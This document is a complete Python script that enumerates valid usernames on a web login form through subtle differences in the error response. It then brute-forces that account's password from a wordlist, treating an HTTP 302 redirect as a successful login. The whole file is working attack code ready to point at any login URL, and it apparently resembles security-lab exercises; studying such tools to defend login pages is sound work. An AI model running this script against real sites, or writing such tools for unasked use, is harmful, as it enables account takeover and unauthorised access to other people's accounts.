import requests
import sys
import time

def check_username(url, username, error_message):
    """
    This function sends a POST request with the given username and checks if the response differs from the normal error message.
    """
    data = {
        'username': username,
        'password': 'invalid-password'  # Static invalid password for enumeration
    }

    try:
        response = requests.post(url, data=data, timeout=10)  # Add a timeout to avoid hanging requests
        # Check if the response contains the error message (could use more nuanced checks like response length or specific text)
        if error_message not in response.text:
            print(f"(+) Found subtle difference with username: {username}")
            return True
        else:
            print(f"(-) Username: {username} resulted in regular response.")
            return False
    except requests.exceptions.RequestException as e:
        print(f"Request failed for {username}: {e}")
        return False


def brute_force_usernames(url, username_file, error_message):
    """
    This function iterates through a file of usernames and checks each one against the login page.
    """
    try:
        with open(username_file, 'r') as file:
            usernames = file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: File {username_file} not found.")
        sys.exit(1)

    if not usernames:
        print("Error: Username file is empty.")
        sys.exit(1)

    for username in usernames:
        print(f"[*] Trying username: {username}")
        if check_username(url, username, error_message):
            return username  # Return the valid username
    return None


def brute_force_passwords(url, username, password_file):
    """
    This function iterates through a file of passwords and checks each one against the login page with the valid username.
    """
    try:
        with open(password_file, 'r') as file:
            passwords = file.read().splitlines()
    except FileNotFoundError:
        print(f"Error: File {password_file} not found.")
        sys.exit(1)

    if not passwords:
        print("Error: Password file is empty.")
        sys.exit(1)

    for password in passwords:
        print(f"[*] Trying password: {password}")
        data = {
            'username': username,
            'password': password
        }

        try:
            # Prevent redirect to capture the 302 response
            response = requests.post(url, data=data, allow_redirects=False, timeout=10)
            if response.status_code == 302:  # Success if 302 found
                print(f"(+) Password found: {password}")
                return password
        except requests.exceptions.RequestException as e:
            print(f"Request failed for password {password}: {e}")

    print("(-) No valid password found.")
    return None


def main():
    if len(sys.argv) != 4:
        print(f"(+) Usage: {sys.argv[0]} <url> <usernames file> <passwords file>")
        print(f"(+) Example: {sys.argv[0]} http://example.com/login usernames.txt passwords.txt")
        sys.exit(1)

    url = sys.argv[1]
    username_file = sys.argv[2]
    password_file = sys.argv[3]

    # Step 1: Brute force usernames
    error_message = "Invalid username or password."  # Adjust this to match the known error message
    print("(+) Starting username enumeration...")
    valid_username = brute_force_usernames(url, username_file, error_message)

    if valid_username:
        print(f"(+) Valid username identified: {valid_username}")

        # Step 2: Brute force passwords
        print(f"(+) Starting password brute force for user: {valid_username}")
        valid_password = brute_force_passwords(url, valid_username, password_file)

        if valid_password:
            print(f"(+) Success! Username: {valid_username}, Password: {valid_password}")
        else:
            print("(-) Password brute force failed.")
    else:
        print("(-) Username enumeration failed.")


if __name__ == "__main__":
    main()
